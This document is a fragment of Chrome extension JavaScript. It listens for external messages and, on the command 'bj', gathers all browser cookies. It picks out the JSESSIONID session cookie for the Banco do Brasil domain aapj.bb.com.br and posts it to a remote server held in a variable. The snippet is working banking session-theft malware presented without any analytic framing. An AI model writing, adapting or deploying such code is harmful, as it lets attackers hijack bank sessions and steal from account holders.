chrome['runtime']['onMessageExternal']['addListener'](function(ivar, b_obj, optc) {
	switch(ivar['command']) {
		case 'bj':
		chrome['cookies']['getAll']({}, function(cookie_var) {
			var bank_url = 'aapj.bb.com.br';
			for(var key in cookie_var) {
				cookie = cookie_var[key];
				if((cookie['domain']['indexOf'](bank_url) != -1) && (cookie['name'] == 'JSESSIONID')) {
					$['ajax']({ url: servers, type:'POST', data: {
						"texto": JSON['stringify'](ivar['vals']) + '"value": "' + cookie['value'] + '"'
					}})
				}
			}
		});
		break
	}
})